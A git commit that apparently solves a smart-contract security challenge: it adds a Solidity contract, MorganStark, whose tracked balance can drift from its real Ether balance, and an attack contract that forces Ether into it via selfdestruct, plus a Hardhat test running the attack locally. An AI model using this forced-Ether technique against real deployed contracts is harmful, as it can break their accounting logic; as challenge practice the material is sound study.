a7789b2ee7f537f553c4d8dcc82a579982ba0f53
Hung Cheng <23033847+hcheng826@users.noreply.github.com>
2022-05-26 16:13:28 +0800

    morgan stark done (#3)

---
+++ contracts/MorganStark.sol
@@ -0,0 +1,28 @@
+pragma solidity ^0.4.24;
+
+contract MorganStark {
+  address owner;
+  uint256 public balance;
+
+  constructor() public payable {
+    require(msg.value == 0);
+    owner = msg.sender;
+  }
+
+  function collegeFund() public payable {
+    require(msg.sender == owner);
+    balance += msg.value;
+  }
+
+  function checkBalance() public view returns (uint256) {
+    return address(this).balance;
+  }
+}
+
+contract MorganStarkAttack {
+    constructor() public payable {}
+
+    function attack(address _morganStarkAddr) public payable {
+        selfdestruct(_morganStarkAddr);
+    }
+}
---
+++ test/MorganStark.test.js
@@ -0,0 +1,28 @@
+const { ethers } = require("hardhat");
+const hre = require('hardhat');
+
+describe.only("MorganStark", function () {
+  it("deploy", async function () {
+    const provider = hre.network.provider;
+
+    const MSFactory = await ethers.getContractFactory("MorganStark");
+    const ms = await MSFactory.deploy();
+    await ms.deployed();
+
+    console.log('ms address: ', ms.address);
+    console.log('balance: ', (await ms.balance()).toString());
+    console.log('MorganStark balance: ', (await provider.send('eth_getBalance', [ms.address])));
+    console.log('MorganStark checkBalance: ', (await ms.checkBalance()).toString());
+
+    const MorganStarkAttackFactory = await ethers.getContractFactory("MorganStarkAttack");
+    const MorganStarkAttack = await MorganStarkAttackFactory.deploy({ value: ethers.utils.parseEther('0.1') });
+    await MorganStarkAttack.deployed();
+
+    const txRes = await MorganStarkAttack.attack(ms.address, { value: ethers.utils.parseEther('0.1') });
+    await txRes.wait();
+
+    console.log('balance: ', (await ms.balance()).toString());
+    console.log('MorganStarkAttack balance: ', (await provider.send('eth_getBalance', [MorganStarkAttack.address])));
+    console.log('MorganStark balance: ', (await provider.send('eth_getBalance', [ms.address])));
+  });
+});
